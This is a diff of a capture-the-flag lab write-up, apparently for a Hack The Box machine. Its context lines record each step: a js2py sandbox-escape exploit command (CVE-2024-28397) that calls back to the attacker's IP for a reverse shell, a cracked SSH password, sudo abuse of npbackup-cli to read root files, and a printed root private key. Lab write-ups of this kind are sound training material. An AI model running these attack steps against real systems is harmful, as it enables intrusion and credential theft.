@@ -23,16 +23,16 @@ PORT     STATE SERVICE REASON         VERSION
 |_  Supported Methods: HEAD OPTIONS GET
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-![[Pasted image 20251213123912.png]]
+![Pasted image 20251213123912](../Attachments/Pasted%20image%2020251213123912.png)
 - There is a basic repo of the app which I can download and I find a users.db. I am guessing I need to access this when breaking out of the sandbox
-![[Pasted image 20251213143142.png]]
+![Pasted image 20251213143142](../Attachments/Pasted%20image%2020251213143142.png)
 - Also js2py is installed:
-![[Pasted image 20251213144532.png]]
+![Pasted image 20251213144532](../Attachments/Pasted%20image%2020251213144532.png)
 - I also find an appsecretkey:`S3cr3tK3yC0d3PartTw0`
-![[Pasted image 20251213145223.png]]
+![Pasted image 20251213145223](../Attachments/Pasted%20image%2020251213145223.png)
 
 - I register as user `test:test` and login to find the sandbox:
-![[Pasted image 20251213143231.png]]
+![Pasted image 20251213143231](../Attachments/Pasted%20image%2020251213143231.png)
 - Requires Javascript code.
 
 - Online i find a sandbox escape: CVE-2024-28397  
@@ -41,7 +41,7 @@ https://github.com/harutomo-jp/CVE-2024-28397-RCE
 ```
 python exploit.py 10.10.11.82:8000 /run_code --local_ip 10.10.14.21 --local_port 9999
 ```
-![[Pasted image 20251213151906.png]]
+![Pasted image 20251213151906](../Attachments/Pasted%20image%2020251213151906.png)
 
 - Or I can directly pass the exploit on the browser:
 ```
@@ -101,7 +101,7 @@ console.log(n11);
 n11
 
 ```
-![[Pasted image 20251213152000.png]]
+![Pasted image 20251213152000](../Attachments/Pasted%20image%2020251213152000.png)
 
 - As user app I can read the users.db to find the MD5 hash of marco which I can crack from crackstation.net
 ```
@@ -129,18 +129,18 @@ CREATE TABLE code_snippet (
 );
 COMMIT;
 ```
-![[Pasted image 20251213152442.png]]
-![[Pasted image 20251213152503.png]]
+![Pasted image 20251213152442](../Attachments/Pasted%20image%2020251213152442.png)
+![Pasted image 20251213152503](../Attachments/Pasted%20image%2020251213152503.png)
 
 - I can ssh into target as `marco:sweetangelbabylove`
 ```
 ssh marco@codeparttwo.htb
 Password: sweetangelbabylove
 ```
-![[Pasted image 20251213152606.png]]
+![Pasted image 20251213152606](../Attachments/Pasted%20image%2020251213152606.png)
 
 - I grab user flag:
-![[Pasted image 20251213152810.png]]
+![Pasted image 20251213152810](../Attachments/Pasted%20image%2020251213152810.png)
 
 - Checking sudo privilegs:
 ```
@@ -153,7 +153,7 @@ Matching Defaults entries for marco on codeparttwo:
 User marco may run the following commands on codeparttwo:
     (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
 ```
-![[Pasted image 20251213152844.png]]
+![Pasted image 20251213152844](../Attachments/Pasted%20image%2020251213152844.png)
 
 - I read the file in : `/usr/local/bin/npbackup-cli`
 ```
@@ -174,13 +174,13 @@ if __name__ == '__main__':
     sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
     sys.exit(main())
 ```
-![[Pasted image 20251213152943.png]]
+![Pasted image 20251213152943](../Attachments/Pasted%20image%2020251213152943.png)
 
 - Also checking id I am part of group backups:
-![[Pasted image 20251213153008.png]]
+![Pasted image 20251213153008](../Attachments/Pasted%20image%2020251213153008.png)
 
 - There is a folder in `/opt` which is owned by root and group backups. I can now access it:
-![[Pasted image 20251213153045.png]]
+![Pasted image 20251213153045](../Attachments/Pasted%20image%2020251213153045.png)
 - But there is nothing inside.
 
 - Looking online I find an exploit that gives the config file (https://github.com/AliElKhatteb/npbackup-cli-priv-escalation). I edit it to give the path fo root (can add more like `/etc/shadow`)
@@ -354,7 +354,7 @@ snapshot e21fc82f saved
 2025-12-13 21:14:03,618 :: INFO :: Operation finished
 2025-12-13 21:14:03,624 :: INFO :: ExecTime = 0:00:04.526991, finished, state is: success.
 ```
-![[Pasted image 20251213162624.png]]
+![Pasted image 20251213162624](../Attachments/Pasted%20image%2020251213162624.png)
 
 - I then grab root's `id_rsa` key with the path and snapshot id from the output of last command:
 ```
@@ -400,15 +400,15 @@ kXQKJhgScWFD3dnPx6cJRLChJayc0FHz02KYGRP3KQIedpOJDAFF096MXhBT7W9ZO8Pen/
 MBhgprGCU3dhhJMQAAAAxyb290QGNvZGV0d28BAgMEBQ==
 -----END OPENSSH PRIVATE KEY-----
 ```
-![[Pasted image 20251213162653.png]]
+![Pasted image 20251213162653](../Attachments/Pasted%20image%2020251213162653.png)
 - I copy the key locally, add the permissions and log into target as root:
-![[Pasted image 20251213162724.png]]
+![Pasted image 20251213162724](../Attachments/Pasted%20image%2020251213162724.png)
 ```
 vi root_id_rsa            # Copy key here
 chmod 0600 root_id_rsa
 ssh root@codeparttwo.htb -i root_id_rsa
 ```
-![[Pasted image 20251213162020.png]]
+![Pasted image 20251213162020](../Attachments/Pasted%20image%2020251213162020.png)
 
 - I grab root flag:
-![[Pasted image 20251213162041.png]]
+![Pasted image 20251213162041](../Attachments/Pasted%20image%2020251213162041.png)
